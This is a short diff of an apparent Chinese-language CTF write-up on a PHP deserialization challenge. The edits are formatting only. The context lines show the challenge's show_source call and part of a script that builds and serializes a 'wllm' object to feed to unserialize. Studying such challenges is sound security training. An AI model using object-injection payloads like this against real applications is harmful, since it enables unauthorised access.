@@ -18,7 +18,6 @@ Disallow: 什么东西呢？
 
 ```php
 <?php
-
 error_reporting(0);
 show_source("cl45s.php");
 
@@ -56,7 +55,6 @@ unserialize($p);
 因此同样构造一个类, 然后序列化, 然后url编码; (有一些不可见字符可能丢失;)
 
 ```php
-
 <?php
 class wllm {
     public $admin;
@@ -77,3 +75,4 @@ $serialized = serialize($instance);
 // 输出序列化字符串
 echo $serialized;
 ?>
+```
